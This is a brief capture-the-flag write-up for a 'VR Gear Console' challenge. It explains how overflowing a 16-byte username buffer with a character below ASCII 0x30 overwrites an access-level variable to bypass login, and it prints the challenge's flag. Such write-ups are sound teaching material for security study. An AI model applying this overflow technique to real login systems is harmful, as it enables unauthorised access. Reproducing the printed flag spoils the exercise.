# VR Gear Console

> Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/d07d574d3d27c5eeb03bce97956ef1c3

Hints:

> What happens if you read in more characters than the length of the username buffer?

> You should look at an ascii table to see what character you need to choose.

> Numbers are stored in little-endian format, which means that the lowest byte of the number is first.

> "cat file - | vrgearconsole " will keep the pipe open for commands.

We can see that we can input more than 16 (null byte at the end of the string also counts) characters as the username which causes buffer overflow. After our username in memory there's accessLevel variable.
It means the 16th username character will become our accessLevel. If this variable is lower than 0x30 we will get flag. Characters we can use are space and `!"#$%&'()*+,-./`.

By the way, you can also overflow password buffer. To do that you need to type 48 characters (32 for password and 16 for username) and then one of the characters with ASCII code below 0x30.

The flag is `1ce8d7a95570d97333d52675fe099c27`.
